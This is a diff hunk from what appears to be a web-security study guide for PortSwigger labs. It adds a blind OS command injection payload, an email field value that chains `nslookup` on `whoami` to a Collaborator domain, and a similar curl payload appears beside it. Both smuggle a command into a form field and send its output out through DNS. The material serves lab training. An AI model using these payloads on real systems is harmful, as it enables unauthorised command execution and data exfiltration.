@@ -3249,6 +3249,12 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 [leetCipher Github scripts for Blind OS DNS exfiltrate](https://github.com/leetCipher/bug-bounty-labs/tree/main/dns-exfiltration-lab/poc)  
   
+>PortSwigger Lab payload perform a DNS lookup using `nslookup` as a Burp Collaborator subdomain.  
+
+```
+email=peanut2019@nuts.net||nslookup+`whoami`.COLLABORATOR.NET||
+```  
+
 [PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
   
 ### Output redirection  
